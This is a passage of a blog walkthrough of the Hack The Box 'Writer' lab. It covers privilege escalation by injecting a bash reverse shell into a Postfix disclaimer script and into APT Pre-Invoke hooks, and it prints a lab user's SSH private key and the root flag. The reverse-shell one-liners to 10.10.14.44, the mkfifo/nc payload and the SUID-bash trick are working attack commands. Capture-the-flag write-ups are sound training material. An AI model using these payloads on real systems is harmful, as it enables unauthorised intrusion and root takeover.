+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
+</span></code></pre></td>
+<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#ff79c6>#!/bin/sh
+</span><span style=color:#ff79c6></span>
+<span style=color:#6272a4># Localize these.</span>
+<span style=color:#8be9fd;font-style:italic>INSPECT_DIR</span><span style=color:#ff79c6>=</span>/var/spool/filter
+<span style=color:#8be9fd;font-style:italic>SENDMAIL</span><span style=color:#ff79c6>=</span>/usr/sbin/sendmail
+
+<span style=color:#6272a4># Get disclaimer addresses</span>
+<span style=color:#8be9fd;font-style:italic>DISCLAIMER_ADDRESSES</span><span style=color:#ff79c6>=</span>/etc/postfix/disclaimer_addresses
+
+<span style=color:#6272a4># Exit codes from &lt;sysexits.h&gt;</span>
+<span style=color:#8be9fd;font-style:italic>EX_TEMPFAIL</span><span style=color:#ff79c6>=</span><span style=color:#bd93f9>75</span>
+<span style=color:#8be9fd;font-style:italic>EX_UNAVAILABLE</span><span style=color:#ff79c6>=</span><span style=color:#bd93f9>69</span>
+
+<span style=color:#6272a4># Clean up when done or when aborting.</span>
+<span style=color:#8be9fd;font-style:italic>trap</span> <span style=color:#f1fa8c>&#34;rm -f in.</span><span style=color:#8be9fd;font-style:italic>$$</span><span style=color:#f1fa8c>&#34;</span> <span style=color:#bd93f9>0</span> <span style=color:#bd93f9>1</span> <span style=color:#bd93f9>2</span> <span style=color:#bd93f9>3</span> <span style=color:#bd93f9>15</span>
+
+<span style=color:#6272a4># Start processing.</span>
+<span style=color:#8be9fd;font-style:italic>cd</span> <span style=color:#8be9fd;font-style:italic>$INSPECT_DIR</span> <span style=color:#ff79c6>||</span> <span style=color:#ff79c6>{</span> <span style=color:#8be9fd;font-style:italic>echo</span> <span style=color:#8be9fd;font-style:italic>$INSPECT_DIR</span> does not exist; <span style=color:#8be9fd;font-style:italic>exit</span>
+<span style=color:#8be9fd;font-style:italic>$EX_TEMPFAIL</span>; <span style=color:#ff79c6>}</span>
+
+cat &gt;in.<span style=color:#8be9fd;font-style:italic>$$</span> <span style=color:#ff79c6>||</span> <span style=color:#ff79c6>{</span> <span style=color:#8be9fd;font-style:italic>echo</span> Cannot save mail to file; <span style=color:#8be9fd;font-style:italic>exit</span> <span style=color:#8be9fd;font-style:italic>$EX_TEMPFAIL</span>; <span style=color:#ff79c6>}</span>
+
+<span style=color:#6272a4># obtain From address</span>
+<span style=color:#8be9fd;font-style:italic>from_address</span><span style=color:#ff79c6>=</span><span style=color:#f1fa8c>`</span>grep -m <span style=color:#bd93f9>1</span> <span style=color:#f1fa8c>&#34;From:&#34;</span> in.<span style=color:#8be9fd;font-style:italic>$$</span> | cut -d <span style=color:#f1fa8c>&#34;&lt;&#34;</span> -f <span style=color:#bd93f9>2</span> | cut -d <span style=color:#f1fa8c>&#34;&gt;&#34;</span> -f 1<span style=color:#f1fa8c>`</span>
+
+<span style=color:#ff79c6>if</span> <span style=color:#ff79c6>[</span> <span style=color:#f1fa8c>`</span>grep -wi ^<span style=color:#f1fa8c>${</span><span style=color:#8be9fd;font-style:italic>from_address</span><span style=color:#f1fa8c>}</span>$ <span style=color:#f1fa8c>${</span><span style=color:#8be9fd;font-style:italic>DISCLAIMER_ADDRESSES</span><span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>`</span> <span style=color:#ff79c6>]</span>; <span style=color:#ff79c6>then</span>
+  /usr/bin/altermime --input<span style=color:#ff79c6>=</span>in.<span style=color:#8be9fd;font-style:italic>$$</span> <span style=color:#f1fa8c>\
+</span><span style=color:#f1fa8c></span>                   --disclaimer<span style=color:#ff79c6>=</span>/etc/postfix/disclaimer.txt <span style=color:#f1fa8c>\
+</span><span style=color:#f1fa8c></span>                   --disclaimer-html<span style=color:#ff79c6>=</span>/etc/postfix/disclaimer.txt <span style=color:#f1fa8c>\
+</span><span style=color:#f1fa8c></span>                   --xheader<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm&#34;</span> <span style=color:#ff79c6>||</span> <span style=color:#f1fa8c>\
+</span><span style=color:#f1fa8c></span>                    <span style=color:#ff79c6>{</span> <span style=color:#8be9fd;font-style:italic>echo</span> Message content rejected; <span style=color:#8be9fd;font-style:italic>exit</span> <span style=color:#8be9fd;font-style:italic>$EX_UNAVAILABLE</span>; <span style=color:#ff79c6>}</span>
+<span style=color:#ff79c6>fi</span>
+
+<span style=color:#8be9fd;font-style:italic>$SENDMAIL</span> <span style=color:#f1fa8c>&#34;</span><span style=color:#8be9fd;font-style:italic>$@</span><span style=color:#f1fa8c>&#34;</span> &lt;in.<span style=color:#8be9fd;font-style:italic>$$</span>
+
+<span style=color:#8be9fd;font-style:italic>exit</span> <span style=color:#8be9fd;font-style:italic>$?</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>We can modify the beginning of the script with a reverse shell:</p>
+<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
+<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
+</span></code></pre></td>
+<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#ff79c6>#!/bin/sh
+</span><span style=color:#ff79c6></span>bash -c <span style=color:#f1fa8c>&#34;bash -i &amp;&gt; /dev/tcp/10.10.14.44/443 0&gt;&amp;1&#34;</span>
+
+<span style=color:#6272a4># Localize these.</span>
+<span style=color:#8be9fd;font-style:italic>INSPECT_DIR</span><span style=color:#ff79c6>=</span>/var/spool/filter
+<span style=color:#8be9fd;font-style:italic>SENDMAIL</span><span style=color:#ff79c6>=</span>/usr/sbin/sendmail
+</code></pre></td></tr></table>
+</div>
+</div><p>We successfully test locally the exploit before copying the it in /etc/postfix.</p>
+<pre><code>kyle@writer:~$ ./disclaimer
+./disclaimer: 23: cannot create in.924887: Permission denied
+Cannot save mail to file
+kyle@writer:~$
+────────────────────────────────────────────────────────────────────
+nc -lnvp 443
+Listening on 0.0.0.0 443
+Connection received on 172.19.0.1 58556
+kyle@writer:~$
+</code></pre>
+<p>Next step is to send an email to john. If we are lucky there will be some kind of out of office email with the disclaimer attached. We can use netcat or telnet to send as described below, but we have to do it very fast because there is a veryfrequent cron job that revert our changes on the disclaimer file.</p>
+<p>Resource: <a href=https://book.hacktricks.xyz/pentesting/pentesting-smtp>https://book.hacktricks.xyz/pentesting/pentesting-smtp</a></p>
+<pre><code>kyle@writer:~$ cp ./disclaimer /etc/postfix/
+kyle@writer:~$ nc 127.0.0.1 25
+220 writer.htb ESMTP Postfix (Ubuntu)
+HELO writer.htb
+250 writer.htb
+MAIL FROM: kyle@writer.htb
+250 2.1.0 Ok
+RCPT TO: john@writer.htb
+250 2.1.5 Ok
+DATA
+From: kyle@writer.htb
+To: john@writer.htb
+Subject: Test
+Date: Thu, 20 Dec 2012 12:00:00 +0000
+
+Testing
+.354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
+
+250 2.0.0 Ok: queued as 36E8269C
+QUIT
+221 2.0.0 Bye
+EXIT
+kyle@writer:~$
+────────────────────────────────────────────────────────────────────
+rlwrap nc -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 172.19.0.1 58592
+bash: cannot set terminal process group (927390): Inappropriate ioctl for device
+bash: no job control in this shell
+john@writer:/var/spool/postfix$ id
+id
+uid=1001(john) gid=1001(john) groups=1001(john)
+</code></pre>
+<h3 id=python-approach>python approach</h3>
+<p>A faster approach and more effective approach is to use python or the sendmail command after SSH forward the SMTP port. I have chosen local port 9025.</p>
+<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
+<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span></code></pre></td>
+<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#6272a4>#!/usr/bin/env python3</span>
+<span style=color:#ff79c6>import</span> smtplib
+
+h, p <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;127.0.0.1&#39;</span>, <span style=color:#bd93f9>9025</span>
+From <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;kyle@writer.htb&#39;</span>
+To <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;john@writer.htb&#39;</span>
+
+Message <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;&#39;&#39;</span><span style=color:#f1fa8c>\
+</span><span style=color:#f1fa8c></span><span style=color:#f1fa8c>Subject: Hi John
+</span><span style=color:#f1fa8c>
+</span><span style=color:#f1fa8c>Regards
+</span><span style=color:#f1fa8c>&#39;&#39;&#39;</span>
+
+io <span style=color:#ff79c6>=</span> smtplib<span style=color:#ff79c6>.</span>SMTP(h,p)
+<span style=color:#ff79c6>try</span>:
+    io<span style=color:#ff79c6>.</span>ehlo()
+    io<span style=color:#ff79c6>.</span>sendmail(From,To,Message)
+<span style=color:#ff79c6>except</span> Exceptions <span style=color:#ff79c6>as</span> e:
+    <span style=color:#8be9fd;font-style:italic>print</span> (e)
+<span style=color:#ff79c6>finally</span>:
+    io<span style=color:#ff79c6>.</span>quit()
+</code></pre></td></tr></table>
+</div>
+</div><p>We start a netcat listener, copy the modified disclaimer and immediately send the email</p>
+<pre><code>ssh kyle@writer.htb -L 9025:localhost:25
+kyle@writer:~$ cp ./disclaimer /etc/postfix/
+────────────────────────────────────────────────────────────────────
+python3 send_email.py
+────────────────────────────────────────────────────────────────────
+rlwrap nc -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 172.19.0.1 58628
+bash: cannot set terminal process group (951191): Inappropriate ioctl for device
+bash: no job control in this shell
+john@writer:/var/spool/postfix$
+</code></pre>
+<h3 id=command-line-approach>Command-line approach</h3>
+<pre><code>sudo apt install swaks
+swaks --to john@writer.htb --from kyle@john.htb --header &quot;Subject: Hi&quot; --body &quot;Regards&quot; --server 127.0.0.1 --port 9025
+
+You can even [use curl to send email](https://blog.edmdesigner.com/send-email-from-linux-command-line/)
+</code></pre>
+<h3 id=stable-shell-with-ssh-as-john>Stable shell with SSH as john</h3>
+<pre><code>john@writer:/home/john/.ssh$ cat id_rsa
+cat &gt;  id_rsa &lt;&lt; EOF
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+EOF
+ssh -i id_rsa john@writer.htb
+john@writer:~$ id
+uid=1001(john) gid=1001(john) groups=1001(john),1003(management)
+</code></pre>
+<p>The management group needs to be explored:</p>
+<pre><code>find / -group management 2&gt;/dev/null
+/etc/apt/apt.conf.d
+</code></pre>
+<p>The folder belongs to management group, and we have write permissions:</p>
+<pre><code>john@writer:/etc/apt/apt.conf.d$ ls -l /etc/apt | grep apt.conf.d
+drwxrwxr-x 2 root management 4096 Oct 27 17:56 apt.conf.d
+john@writer:/etc/apt/apt.conf.d$ ls -la /etc/apt/apt.conf.d
+total 48
+drwxrwxr-x 2 root management 4096 Oct 27 17:56 .
+drwxr-xr-x 7 root root       4096 Jul  9 10:59 ..
+-rw-r--r-- 1 root root        630 Apr  9  2020 01autoremove
+-rw-r--r-- 1 root root         92 Apr  9  2020 01-vendor-ubuntu
+-rw-r--r-- 1 root root        129 Dec  4  2020 10periodic
+-rw-r--r-- 1 root root        108 Dec  4  2020 15update-stamp
+-rw-r--r-- 1 root root         85 Dec  4  2020 20archive
+-rw-r--r-- 1 root root       1040 Sep 23  2020 20packagekit
+-rw-r--r-- 1 root root        114 Nov 19  2020 20snapd.conf
+-rw-r--r-- 1 root root        625 Oct  7  2019 50command-not-found
+-rw-r--r-- 1 root root        182 Aug  3  2019 70debconf
+-rw-r--r-- 1 root root        305 Dec  4  2020 99update-notifier
+</code></pre>
+<h3 id=apt-privesc>APT privesc</h3>
+<p>Resources:</p>
+<ul>
+<li><a href=https://gtfobins.github.io/gtfobins/apt-get/>https://gtfobins.github.io/gtfobins/apt-get/</a></li>
+<li><a href=https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/>https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/</a></li>
+</ul>
+<p>We can create a file <strong>01-reverse-shell</strong> :</p>
+<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
+<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>cat &gt; /etc/apt/apt.conf.d/01-reverse-shell <span style=color:#f1fa8c>&lt;&lt; EOF
+</span><span style=color:#f1fa8c>apt::Update::Pre-Invoke {&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.44/445 0&gt;&amp;1&#39;&#34;};
+</span><span style=color:#f1fa8c>EOF</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>We copy the file and we start a netcat listener on port 445. We can monitor with pspy when is the next apt update:</p>
+<pre tabindex=0><code>rlwrap nc -lvnp 445
+Listening on 0.0.0.0 445
+Connection received on 172.19.0.1 65422
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+3fa76d8d71c2c0ccbc57f2e7034b1992
+</code></pre><p>Different reverse shells can be used to get privesc here:</p>
+<pre><code>echo 'apt::Update::Pre-Invoke {&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.44 445 &gt;/tmp/f&quot;};' &gt; /etc/apt/apt.conf.d/01-reverse-shell
+echo &quot;apt::Update::Pre-Invoke {\&quot;bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.44/445 0&gt;&amp;1'\&quot;};&quot; &gt; /etc/apt/apt.conf.d/01-reverse-shell
+echo 'apt::Update::Pre-Invoke {&quot;chmod +s /bin/bash&quot;};' &gt; /etc/apt/apt.conf.d/01-shell-as-root
+</code></pre>
+</div>
+</article>
+<hr>
+<div class=sharing-buttons>
+<a class=resp-sharing-button__link href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-writer%2f" target=_blank rel=noopener aria-label title="Share on facebook">
+<div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://twitter.com/intent/tweet/?url=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-writer%2f" target=_blank rel=noopener aria-label title="Share on twitter">
+<div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+<div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://www.tumblr.com/widgets/share/tool?posttype=link&title=Htb%20Writer&caption=Htb%20Writer&canonicalUrl=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-writer%2f" target=_blank rel=noopener aria-label title="Share on tumblr">
+<div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+<div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093.0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941.0 9.999.0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="mailto:?subject=Htb%20Writer&body=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-writer%2f" target=_self rel=noopener aria-label title="Share via email">
+<div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1.0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1.0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-writer%2f&media=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-writer%2f;description=Htb%20Writer" target=_blank rel=noopener aria-label title="Share on pinterest">
+<div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12.017.0C5.396.0.029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024.0 1.518.769 1.518 1.688.0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128.0 3.768-2.245 3.768-5.487.0-2.861-2.063-4.869-5.008-4.869-3.41.0-5.409 2.562-5.409 5.199.0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646.0-3.776 2.748-7.252 7.92-7.252 4.158.0 7.392 2.967 7.392 6.923.0 4.135-2.607 7.462-6.233 7.462-1.214.0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607.0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017.0z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-writer%2f&title=Htb%20Writer&summary=Htb%20Writer&source=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-writer%2f" target=_blank rel=noopener aria-label title="Share on linkedin">
+<div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://reddit.com/submit/?url=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-writer%2f&resubmit=true&title=Htb%20Writer" target=_blank rel=noopener aria-label title="Share on reddit">
